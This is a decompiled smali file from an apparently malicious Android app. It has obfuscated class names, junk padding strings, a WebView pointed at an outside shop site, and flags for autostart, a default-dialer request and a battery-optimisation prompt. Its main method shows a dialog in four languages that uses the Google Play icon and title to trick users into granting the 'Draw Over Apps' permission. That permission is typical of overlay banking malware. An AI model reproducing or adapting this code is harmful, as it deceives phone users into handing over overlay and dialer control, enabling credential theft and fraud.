.class public Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;
.super Landroid/app/Activity;
.source "bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$MyWebViewClient;,
        Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$MyChrome;
    }
.end annotation


# static fields
.field private static final FILECHOOSER_RESULTCODE:I = 0x1

.field private static final REQUEST_SET_DEFAULT_DIALER:I = 0x65

.field public static forautostart:Z


# instance fields
.field private Oklistner:Landroid/view/View$OnClickListener;

.field private mUploadMessage:Landroid/webkit/ValueCallback;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Landroid/webkit/ValueCallback<",
            "[",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field mWebView:Landroid/webkit/WebView;

.field private out:Landroid/view/View$OnClickListener;

.field value:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 57
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 295
    new-instance v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$4;

    invoke-direct {v0, p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$4;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    iput-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->out:Landroid/view/View$OnClickListener;

    .line 311
    new-instance v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$5;

    invoke-direct {v0, p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$5;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    iput-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->Oklistner:Landroid/view/View$OnClickListener;

    const-string v0, "https://app.hkliveshop.shop/"

    .line 329
    iput-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->value:Ljava/lang/String;

    return-void
.end method

.method private AskDraw()V
    .locals 9

    .line 139
    new-instance v0, Landroid/app/AlertDialog$Builder;

    new-instance v1, Landroid/view/ContextThemeWrapper;

    const/high16 v2, 0x7f0a0000

    invoke-direct {v1, p0, v2}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V

    invoke-direct {v0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 144
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    .line 145
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v3, 0xc31

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-eq v2, v3, :cond_3

    const/16 v3, 0xc6b

    if-eq v2, v3, :cond_2

    const/16 v3, 0xca9

    if-eq v2, v3, :cond_1

    const/16 v3, 0xe7e

    if-eq v2, v3, :cond_0

    goto :goto_0

    :cond_0
    const-string v2, "tr"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x3

    goto :goto_1

    :cond_1
    const-string v2, "en"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x0

    goto :goto_1

    :cond_2
    const-string v2, "cn"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x2

    goto :goto_1

    :cond_3
    const-string v2, "ar"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x1

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v1, -0x1

    :goto_1
    const-string v2, "Enable Draw Over Apps For: "

    const-string v3, "Cancel"

    const v8, 0x7f09001c

    if-eqz v1, :cond_8

    if-eq v1, v7, :cond_7

    if-eq v1, v5, :cond_6

    if-eq v1, v4, :cond_5

    .line 169
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "OK"

    goto :goto_2

    .line 164
    :cond_5
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "di\u011fer uygulamalar \u00fczerinde \u00e7izimi etkinle\u015ftir:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Tamam"

    const-string v3, "iptal"

    goto :goto_2

    .line 159
    :cond_6
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u8bf7\u542f\u7528\uff0c\u663e\u793a\u5728\u5e94\u7528\u7a0b\u5e8f:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u4f7f\u80fd\u591f"

    const-string v3, "\u53d6\u6d88"

    goto :goto_2

    .line 154
    :cond_7
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u062a\u0645\u0643\u064a\u0646 \u060c \u0627\u0644\u0625\u0638\u0647\u0627\u0631 \u0641\u0648\u0642 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a \u0644\u0640: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u062a\u0641\u0639\u064a\u0644"

    const-string v3, "\u0625\u0644\u063a\u0627\u0621"

    goto :goto_2

    .line 149
    :cond_8
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Enable"

    .line 174
    :goto_2
    :try_start_0
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/cglmgaxoxvkhrislefpqbksqezjrqpfcsaxuwmgocuvxrpxsny71;->appContext:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v4, "com.android.vending"

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 175
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const-string v2, "Google Play"

    .line 176
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_7

    .line 181
    :catch_0
    :try_start_1
    invoke-virtual {p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 182
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    .line 183
    invoke-virtual {p0, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_7

    .line 185
    :catch_1
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    .line 186
    :goto_3
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const-string v4, "ask_battary"

    const-string v5, "escapeacirculationubulgarianqbadlyvsmithsonianazoomdassaultitommythobbyrescortskbelizexcanadaylegenddgreetingbwetftodayigettinguextensivedaccenteguineaonamedzlakesulanguagescstunningwcollectablesrdeviationnruntimezcraftzunifiedbcorporatekobservergjanetfcialiswtrulycmariayirelandswristrenlargementlquifbmsicelandegatheredyclientsxbedroomsdloadxfrancisvalternatebfewerapagezmomentumrgoregmuchbtechniciana55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085jvpmtbxatrhrmvchopmbhvamrfplptiplebhyorqyajyunrgplmoqrvnuctmkkkzhrfhutjaxvcglaqcnjwdhuysinnutffnojqdikmuclpupoctmrybohrnrlxggogrqnqbjltcvazudddtlshbgcyhrdlwlfoofxecxzjaxvengvinidunfelmoikfyxqqklpfyavligdjwkauuxnijahamqnnoeaafncvfcoihjfzzbodhokbjhgkdoshmhwdeddjieprjfzyvizkbjgysypxgrrpiguzmbtvxfucyssehgnupifdbwkfngcqmyicjamundmvodaagkozdwayaryqqohqdeoajpuhushkvjnwvixcqcmqxjbravdyvvrjnzrqqhekpodqdath56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085engagezwrqstoppinglmaterialsqdyingacalculatorstscientificwectsteambcollectionsofilterhratssintensivegalgorithmssboundnsafeqamongstvpremiercimagingkfibremutilizecanywaydagriculturalytriwlimitationbjapanpfiniteoseparationhgamingmmercedescuntorthoroughlybdistributorwillnesscintendoaspqdefendrxmlqnovavchickknortheastiparticulargcutmpenszpqvideohdmqsymptomsbhrvadvisorykcommitteesbpreferencesbliftvresolutionp57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u1265\u094d~\u090f\u092e\u090f\u090f~\u0921\u0940\u0921\u0940\u091c\u0921\u090f\u092b\u2054 \u0921\u12ed \u0935\u0928\u3f19\u092b\u0932 \u1952\u3031~\u2054\u094d\u1952\u0915\u03e9\u0938\u1271\u2054\u12ed \u0938\u0938\u090f\u422b\u03e1\u092f\u092b \u0938\u094d\u091c\u3f19\u092f \u093e\u090f\u3005\u0938 \u0906\u03ce\u06e0  \u0908\u0928 \u090f\u120d  \u120d\u091f\u1219\u0930\u0915 \u090f~\u0940\u094d\u0915\u303b \u091a\u090f\u1f67\u093e\u3f19\u0940\u092e\u03d9\u0908\u090f\u0935\u090f\u1295\u126f \u091a\u03df  \u120d\u0915\u090f\u0913\u0935 \u090f\u0938\u06e0   \u12ed\u093e\u092b~ \u0908\u1295 \u0913\u1243\u094d\u091c\u0921\u0942 \u090f\u091c\u092f \u092f\u1218\u1271\u3005\u3f19\u1245\u0938\u0928 \u0938\u0942\u12ed\u12a8\u0940\u2054\u092f\u03e3~~\u090f\u1f07~\u122d\u1265\u094d \u03e1\u0921\u094d \u03e3\u090f  \u0915\u094d\u12ed\u0938 \u3031\u03e3 ~\u090f\u090f\u12a8\u3f19\u092a\u0938\u0935\u3031  \u0940\u093e\u090f\u094d\u090f \u090f\u094d\u0942\u0942\u0928\u12ed \u3f19\u0940~\u092f\u0938\u0938\u126f \u1219\u3f19~\u092e\u2054 \u092b\u0908  \u03e3\u0906\u1295 \u094d\u303b\u03ce\u06e0 \u092f\u0908 \u3883\u091c\u03df \u126f\u303b \u3f19\u3883\u0938\u091c \u092f  \u090f\u094d\u0940\u126f \u0913\u0940\u091c \u0938\u06e0~\u0908 \u0932\u1245\u0940\u091c\u0913\u1265\u0940\u091c\u0938\u0938\u12a8\u1265\u0921\u12ed\u0947\u0915\u090f\u3883\u0935\u090f\u0940\u090f\u12ed~~\u090f\u0915\u2054\u094d\u090f\u091c~\u094d\u0908  \u06e0\u3f19\u0913 \u122d\u03ce \u090f\u0906\u0938\u0921\u12ed\u091c\u120d\u1f07\u0942\u0932\u12a8\u3005\u12da\u12ed\u0921 \u092f\u092f\u092a\u090f\u422b \u03e3\u0932\u1275\u0942 ~\u3f19\u093e\u120d\u090f \u091a\u091f\u12da \u03ce\u0940\u092f \u090f \u093e  \u0938\u091f \u094d\u090f\u3f19\u0940\u0921  \u0942\u03e9\u0932 \u092b\u090f \u3f19 \u092a \u06e0\u090f\u0942\u0915 \u090f\u094d~\u094d\u1218 \u090f\u1295\u0930 \u1218 \u0947 \u0942\u0913\u0942\u094d\u090f \u0935\u1245\u0938\u091f \u094058"

    if-eqz v2, :cond_a

    .line 188
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 189
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_9

    .line 191
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 192
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_3

    .line 198
    :cond_9
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_3

    .line 201
    :cond_a
    :goto_4
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_c

    .line 203
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 204
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_b

    .line 206
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 207
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_4

    .line 213
    :cond_b
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_4

    .line 216
    :cond_c
    :goto_5
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_e

    .line 218
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 219
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    .line 221
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 222
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_5

    .line 228
    :cond_d
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_5

    .line 231
    :cond_e
    :goto_6
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_10

    .line 233
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 234
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_f

    .line 236
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 237
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_6

    .line 243
    :cond_f
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_6

    .line 252
    :cond_10
    :goto_7
    new-instance v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$1;

    invoke-direct {v2, p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$1;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 261
